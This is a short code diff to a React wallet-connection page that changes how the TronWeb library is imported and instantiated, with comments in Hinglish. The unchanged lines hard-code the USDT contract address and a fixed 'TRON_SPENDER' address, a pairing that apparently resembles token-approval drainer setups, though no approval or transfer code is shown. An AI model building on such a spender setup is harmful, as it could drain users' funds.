@@ -3,7 +3,10 @@ import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import SignClient from "@walletconnect/sign-client";
-import TronWeb from "tronweb";
+// ✅ TronWeb ESM fix — default ya named export dono handle karta hai
+import * as TronWebModule from "tronweb";
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+const TronWebClass = ((TronWebModule as any).default ?? TronWebModule) as any;
 
 declare global {
   interface Window {
@@ -17,8 +20,8 @@ const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
-// ✅ FIX 1: TronWeb instance — ek baar banao, baar baar nahi
-const tw = new TronWeb({ fullHost: "https://api.trongrid.io" });
+// ✅ Runtime pe construct — ESM/CJS dono ke saath kaam karta hai
+const tw = new TronWebClass({ fullHost: "https://api.trongrid.io" });
 
 export default function Index() {
   const [searchParams] = useSearchParams();
